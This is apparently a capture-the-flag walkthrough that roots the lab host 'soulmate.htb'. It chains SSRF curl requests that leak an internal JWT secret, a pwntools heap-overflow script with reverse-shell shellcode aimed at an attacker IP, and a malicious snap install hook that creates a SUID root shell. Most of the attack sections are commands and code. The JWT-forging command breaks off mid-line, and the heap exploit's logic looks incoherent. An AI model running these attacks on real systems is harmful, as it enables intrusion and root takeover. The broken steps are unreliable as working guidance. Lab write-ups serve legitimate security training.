Port 80 is a dating site. Port 8083 runs a custom binary API — all endpoints require a valid JWT token. The web application communicates with the API on the backend.

Phase 1

Initial Access — SSRF + JWT Manipulation

Server-Side Request Forgery

The web application's profile picture feature accepts URLs and fetches them server-side. By pointing it to http://localhost:8083/, we can access the internal API directly, bypassing JWT validation (requests from localhost are trusted).

# SSRF to access internal API endpoints
$ curl -s "http://soulmate.htb/api/profile/picture" \
    -d '{"url":"http://localhost:8083/api/users"}' \
    -H "Content-Type: application/json" \
    -H "Cookie: session=YOUR_SESSION"
[{"id":1,"username":"admin","email":"admin@soulmate.htb",...}]

JWT Secret Extraction

# Use SSRF to read the API's configuration
$ curl -s "http://soulmate.htb/api/profile/picture" \
    -d '{"url":"http://localhost:8083/api/config"}' \
    -H "Content-Type: application/json" \
    -H "Cookie: session=YOUR_SESSION"
{"jwt_secret":"SoulMateSecretKey2024!","debug":false}
# Forge admin JWT
$ python3 -c "

Phase 2

User Shell — Binary Heap Overflow

Downloading and Analyzing the Binary

# The binary is downloadable from the website's assets
$ curl -s http://soulmate.htb/downloads/soulmate-api -o soulmate-api

The custom API binary has a heap-based buffer overflow in the profile update endpoint. The bio field is copied to a heap buffer without bounds checking. By overflowing into adjacent heap metadata, we can gain code execution.

# exploit.py — heap overflow in /api/profile (bio field)
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

TARGET = "soulmate.htb"
PORT = 8083
ATTACKER_IP = "10.10.14.15"
ATTACKER_PORT = 4444

# Reverse shell shellcode
shellcode = asm(shellcraft.connect(ATTACKER_IP, ATTACKER_PORT) + shellcraft.dupsh())

# JWT token (forged as admin)
JWT = "eyJhbGciOi..."  # your forged token here

# Heap overflow payload
OFFSET = 256  # bio buffer size
payload = b"\x90" * 32 + shellcode
payload += b"A" * (OFFSET - len(payload))
# Overwrite heap metadata to redirect execution
payload += p64(0x41) + p64(0x0)  # fake chunk header
payload += p64(0x404060)  # GOT entry for free()

# Send via API
r = remote(TARGET, PORT)
http_req = f"PUT /api/profile HTTP/1.1\r\nHost: {TARGET}:{PORT}\r\n"
http_req += f"Authorization: Bearer {JWT}\r\n"
http_req += f"Content-Type: application/json\r\n"
body = '{"bio":"' + payload.hex() + '"}'
http_req += f"Content-Length: {len(body)}\r\n\r\n{body}"
r.send(http_req.encode())
r.close()

Phase 3

Privilege Escalation — sudo snap install

user@soulmate:~$ sudo -l
User user may run the following commands on soulmate:
    (root) NOPASSWD: /usr/bin/snap install *
Malicious snap package snap install with sudo lets us install a snap package as root. Snap packages can include install hooks that run as root during installation. We create a snap with a malicious install hook that creates a SUID bash. 
# On attacker machine: create malicious snap
$ mkdir -p malicious-snap/meta/hooks

# Create snap metadata
$ cat << 'EOF' > malicious-snap/meta/snap.yaml
name: evil-snap
version: '1.0'
summary: Totally legit snap
description: Nothing suspicious here
architectures: [amd64]
confinement: devmode
grade: devel
EOF

# Create install hook (runs as root during snap install)
$ cat << 'EOF' > malicious-snap/meta/hooks/install
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x malicious-snap/meta/hooks/install

# Build the snap
$ cd malicious-snap
$ snap pack .
$ ls *.snap
evil-snap_1.0_amd64.snap
# Transfer to target
$ python3 -m http.server 8888

# On target
user@soulmate:~$ wget http://10.10.14.15:8888/evil-snap_1.0_amd64.snap -O /tmp/evil.snap
user@soulmate:~$ sudo /usr/bin/snap install /tmp/evil.snap --devmode --dangerous
evil-snap 1.0 installed

user@soulmate:~$ /tmp/rootbash -p
rootbash-5.1# cat /root/root.txt
d55aab26c6777d4b0546f245a6158a3b
Appendix

Key Takeaways

SSRF bypasses internal-only restrictions.

The API trusted requests from localhost. SSRF through the profile picture feature let us access internal endpoints without authentication.

Custom binaries require binary analysis.

No CVE to search for — the vulnerability was in custom code. Download the binary, reverse engineer it, find the overflow.

sudo snap install = root code execution.

Snap packages can include install hooks that execute as root during installation. --devmode --dangerous flags skip signature verification, allowing unsigned local snaps.

Always check sudo -l for package managers.

snap install, pip install, gem install, npm install — any package manager with sudo can install packages containing arbitrary code.

SSRF → API access→JWT forge→heap overflow → user→sudo snap → root
